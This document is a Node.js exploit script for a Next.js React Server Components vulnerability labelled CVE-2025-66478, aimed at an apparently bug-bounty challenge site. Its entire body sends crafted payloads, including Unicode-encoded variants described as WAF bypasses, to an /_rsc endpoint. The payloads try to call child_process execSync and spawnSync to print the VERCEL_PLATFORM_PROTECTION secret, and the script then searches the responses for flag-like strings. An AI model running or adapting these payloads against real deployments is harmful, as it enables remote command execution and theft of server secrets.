#!/usr/bin/env node

/**
 * React2Shell (CVE-2025-66478) Exploit Script
 * Target: https://nextjs-cve-hackerone.vercel.app/
 * Goal: Extract VERCEL_PLATFORM_PROTECTION environment variable
 */

const TARGET = 'https://nextjs-cve-hackerone.vercel.app';

// Test different payload variations to bypass WAF
const payloads = [
  {
    name: 'Direct execSync',
    data: {
      id: '$$child_process',
      action: 'execSync',
      args: ['echo $VERCEL_PLATFORM_PROTECTION']
    }
  },
  {
    name: 'Unicode encoded',
    data: {
      id: '\u0024\u0024child_process',
      action: 'execSync',
      args: ['echo $VERCEL_PLATFORM_PROTECTION']
    }
  },
  {
    name: 'Internal module path',
    data: {
      id: '$$internal/child_process',
      action: 'execSync',
      args: ['printenv VERCEL_PLATFORM_PROTECTION']
    }
  },
  {
    name: 'Spawn variant',
    data: {
      id: '$$child_process',
      action: 'spawnSync',
      args: ['printenv', ['VERCEL_PLATFORM_PROTECTION']]
    }
  }
];

async function sendExploit(payload) {
  console.log(`\n[*] Testing: ${payload.name}`);

  // Try RSC endpoint
  const rscEndpoint = `${TARGET}/_rsc`;

  try {
    const formData = new FormData();
    formData.append('__rsc_action_metadata', JSON.stringify(payload.data));
    formData.append('__rsc_action_args', JSON.stringify(payload.data.args));

    const response = await fetch(rscEndpoint, {
      method: 'POST',
      body: formData,
      headers: {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0'
      }
    });

    console.log(`[+] Status: ${response.status}`);
    const text = await response.text();
    console.log(`[+] Response: ${text.substring(0, 500)}`);

    // Check for success patterns
    if (text.includes('VERCEL_') || text.match(/[A-Z0-9]{32,}/)) {
      console.log('\n[!!!] POTENTIAL FLAG FOUND [!!!]');
      console.log(text);
    }

  } catch (error) {
    console.log(`[-] Error: ${error.message}`);
  }
}

async function main() {
  console.log('[*] Starting React2Shell exploit');
  console.log(`[*] Target: ${TARGET}`);

  for (const payload of payloads) {
    await sendExploit(payload);
    await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
  }
}

main();
